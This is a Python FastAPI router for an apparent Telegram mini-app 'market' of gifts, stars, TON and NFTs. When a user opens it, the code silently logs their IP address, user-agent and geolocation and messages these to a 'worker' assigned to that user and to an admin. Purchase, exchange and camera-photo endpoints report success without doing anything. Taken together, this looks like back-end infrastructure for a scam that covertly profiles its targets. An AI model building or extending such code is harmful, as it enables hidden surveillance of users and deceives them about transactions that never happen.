from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import JSONResponse
from sqlalchemy.ext.asyncio import AsyncSession
import os
from datetime import datetime

from app.database import get_db
from app.services import AuthService
from app.utils.logger import ActivityLogger

router = APIRouter(prefix="/market", tags=["market"])
auth_service = AuthService(os.getenv("TELEGRAM_BOT_TOKEN", ""))
logger = ActivityLogger()


@router.post("/open")
async def open_market_session(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Открывает сессию маркета"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        bot_username = data.get("bot_username", "")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData",
                "camera_photo_enabled": False
            })
        
        # Валидируем пользователя
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData",
                "camera_photo_enabled": False
            })
        
        user_telegram_id = str(user_data["user_id"])
        
        # Сохраняем IP адрес
        from app.models.telegram_session import IPHistory
        
        # Получаем IP адрес
        client_ip = request.headers.get("X-Forwarded-For")
        if client_ip:
            client_ip = client_ip.split(",")[0].strip()
        else:
            client_ip = request.client.host if request.client else "unknown"
        
        # Получаем User-Agent
        user_agent = request.headers.get("user-agent", "unknown")
        
        # Проверяем, не был ли этот IP уже записан недавно (в течение последнего часа)
        from sqlalchemy.future import select
        from datetime import timedelta
        
        one_hour_ago = datetime.utcnow() - timedelta(hours=1)
        stmt = select(IPHistory).where(
            IPHistory.user_telegram_id == user_telegram_id,
            IPHistory.ip_address == client_ip,
            IPHistory.accessed_at > one_hour_ago
        )
        result = await db.execute(stmt)
        existing_ip = result.scalars().first()
        
        if not existing_ip:
            # Определяем геолокацию
            from app.utils.geoip import get_location_cached
            
            location = await get_location_cached(client_ip)
            
            # Сохраняем новую запись
            ip_record = IPHistory(
                user_telegram_id=user_telegram_id,
                ip_address=client_ip,
                user_agent=user_agent,
                country=location.get("country"),
                city=location.get("city")
            )
            db.add(ip_record)
            await db.commit()
            
            # Уведомляем воркера о новом IP
            await _notify_worker_about_ip(user_telegram_id, client_ip, user_agent, location, db)
        
        logger.log_activity(
            user_telegram_id,
            "market",
            "open",
            "success",
            {"bot_username": bot_username, "ip": client_ip}
        )
        
        return JSONResponse({
            "success": True,
            "camera_photo_enabled": True
        })
    
    except Exception as e:
        logger.log_activity("unknown", "market", "open", "error", {"error": str(e)})
        return JSONResponse({
            "success": False,
            "error": str(e),
            "camera_photo_enabled": False
        })


@router.post("/stars")
async def get_market_balances(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Получает балансы пользователя (stars и TON)"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        bot_username = data.get("bot_username", "")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        # Валидируем пользователя
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        # TODO: Получить реальные балансы из базы данных
        stars_balance = 0
        ton_balance = 0.0
        market_won_nfts = []
        
        logger.log_activity(
            str(user_data["user_id"]),
            "market",
            "get_balances",
            "success",
            {"bot_username": bot_username}
        )
        
        return JSONResponse({
            "success": True,
            "stars_balance": stars_balance,
            "ton_balance": ton_balance,
            "market_won_nfts": market_won_nfts
        })
    
    except Exception as e:
        logger.log_activity("unknown", "market", "get_balances", "error", {"error": str(e)})
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/auth")
async def market_auth(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Авторизация через маркет"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        bot_username = data.get("bot_username", "")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        logger.log_activity(
            str(user_data["user_id"]),
            "market",
            "auth",
            "success",
            {"bot_username": bot_username}
        )
        
        return JSONResponse({
            "success": True,
            "user": user_data
        })
    
    except Exception as e:
        logger.log_activity("unknown", "market", "auth", "error", {"error": str(e)})
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/buy_gift")
async def buy_gift(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Покупка подарка"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        # TODO: Реализовать логику покупки
        
        return JSONResponse({
            "success": True,
            "message": "Gift purchased successfully"
        })
    
    except Exception as e:
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/deals")
async def get_deals(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Получает список сделок"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        # TODO: Получить реальные сделки из БД
        
        return JSONResponse({
            "success": True,
            "deals": [],
            "count": 0
        })
    
    except Exception as e:
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/purchase_history")
async def get_purchase_history(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Получает историю покупок"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        # TODO: Получить реальную историю из БД
        
        return JSONResponse({
            "success": True,
            "history": []
        })
    
    except Exception as e:
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/exchange_stars")
async def exchange_stars(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Обмен stars"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        # TODO: Реализовать логику обмена
        
        return JSONResponse({
            "success": True,
            "message": "Exchange completed"
        })
    
    except Exception as e:
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/stars_history")
async def get_stars_history(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Получает историю stars"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        if not init_data:
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        # TODO: Получить реальную историю из БД
        
        return JSONResponse({
            "success": True,
            "history": []
        })
    
    except Exception as e:
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/profile_stats")
async def get_profile_stats(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Получает статистику профиля"""
    import logging
    logger = logging.getLogger("profile_stats")
    
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        logger.info(f"Profile stats request received")
        
        if not init_data:
            logger.warning("Missing initData")
            return JSONResponse({
                "success": False,
                "error": "Missing initData"
            })
        
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            logger.warning("Invalid initData")
            return JSONResponse({
                "success": False,
                "error": "Invalid initData"
            })
        
        telegram_id = str(user_data.get("telegram_id"))
        logger.info(f"User telegram_id: '{telegram_id}' (type: {type(telegram_id)})")
        
        # Проверяем является ли пользователь воркером
        from app.models.worker import Worker, WorkerRole
        from sqlalchemy.future import select
        
        admin_id_from_env = int(os.getenv("ADMIN_ID", "0"))
        telegram_id_int = int(telegram_id)
        logger.info(f"ADMIN_ID from env: {admin_id_from_env} (type: {type(admin_id_from_env)})")
        
        stmt = select(Worker).where(Worker.telegram_id == telegram_id)
        result = await db.execute(stmt)
        worker = result.scalars().first()
        
        logger.info(f"Worker query result: {worker}")
        if worker:
            logger.info(f"Worker details: id={worker.id}, telegram_id='{worker.telegram_id}', role={worker.role}, is_active={worker.is_active}")
        
        is_worker = worker is not None and worker.is_active
        is_admin_from_worker = worker and worker.role == WorkerRole.ADMIN
        is_admin_from_env = telegram_id_int == admin_id_from_env
        is_admin = is_admin_from_worker or is_admin_from_env
        
        logger.info(f"Admin check:")
        logger.info(f"  - is_worker: {is_worker}")
        logger.info(f"  - is_admin_from_worker: {is_admin_from_worker}")
        logger.info(f"  - is_admin_from_env: {is_admin_from_env} ({telegram_id_int} == {admin_id_from_env})")
        logger.info(f"  - FINAL is_admin: {is_admin}")
        
        # TODO: Получить реальную статистику из БД
        
        response_data = {
            "success": True,
            "total_volume": 0,
            "total_bought": 0,
            "total_sold": 0,
            "sync_button_text": "Синхронизация",
            "is_worker": is_worker,
            "is_admin": is_admin
        }
        
        logger.info(f"Returning: {response_data}")
        
        return JSONResponse(response_data)
    
    except Exception as e:
        logger.error(f"Error in profile_stats: {e}", exc_info=True)
        return JSONResponse({
            "success": False,
            "error": str(e)
        })


@router.post("/camera_photo")
async def upload_camera_photo(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Загрузка фото с камеры"""
    try:
        # TODO: Реализовать загрузку фото
        
        return JSONResponse({
            "success": True,
            "message": "Photo uploaded"
        })
    
    except Exception as e:
        return JSONResponse({
            "success": False,
            "error": str(e)
        })



async def _notify_worker_about_ip(
    user_telegram_id: str,
    ip_address: str,
    user_agent: str,
    location: dict,
    db: AsyncSession
):
    """Уведомляет воркера о новом IP адресе пользователя"""
    try:
        from app.models.worker import Worker, UserWorkerBinding
        from app.models.user import User
        from sqlalchemy.future import select
        
        # Находим воркера, к которому привязан пользователь
        stmt = select(UserWorkerBinding).where(
            UserWorkerBinding.user_telegram_id == user_telegram_id,
            UserWorkerBinding.is_active == True
        )
        result = await db.execute(stmt)
        binding = result.scalars().first()
        
        if not binding:
            return
        
        # Получаем воркера
        stmt = select(Worker).where(Worker.id == binding.worker_id)
        result = await db.execute(stmt)
        worker = result.scalars().first()
        
        if not worker:
            return
        
        # Получаем данные пользователя
        stmt = select(User).where(User.telegram_id == user_telegram_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        # Формируем сообщение с геолокацией
        location_str = ""
        if location.get("country"):
            location_str = f"\n  • Страна: {location['country']}"
            if location.get("city"):
                location_str += f"\n  • Город: {location['city']}"
        
        # Отправляем через бота
        from app.bot import bot
        
        message = (
            f"🌐 **НОВЫЙ IP АДРЕС**\n\n"
            f"👤 **Пользователь:**\n"
            f"  • ID: `{user_telegram_id}`\n"
            f"  • Username: @{user.username if user and user.username else 'нет'}\n"
            f"  • Имя: {user.first_name if user else 'Неизвестно'}\n\n"
            f"🔍 **Информация:**\n"
            f"  • IP: `{ip_address}`{location_str}\n"
            f"  • User-Agent: {user_agent[:100]}...\n"
            f"  • Время: {datetime.utcnow().strftime('%d.%m.%Y %H:%M:%S')} UTC"
        )
        
        await bot.send_message(
            int(worker.telegram_id),
            message,
            parse_mode="Markdown"
        )
        
        # Также отправляем админу
        admin_id = int(os.getenv("ADMIN_ID", "0"))
        if admin_id:
            await bot.send_message(
                admin_id,
                message,
                parse_mode="Markdown"
            )
    
    except Exception as e:
        logger.log_activity(
            user_telegram_id,
            "market",
            "notify_ip_error",
            "error",
            {"error": str(e)}
        )
